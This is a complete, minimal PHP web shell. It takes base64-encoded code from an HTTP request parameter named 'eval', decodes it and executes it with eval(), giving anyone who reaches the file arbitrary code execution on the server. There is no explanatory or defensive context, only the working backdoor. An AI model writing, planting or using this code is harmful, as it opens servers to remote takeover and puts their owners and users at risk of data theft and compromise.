<?php
$s_code = base64_decode($_REQUEST['eval']);
eval($s_code);
?>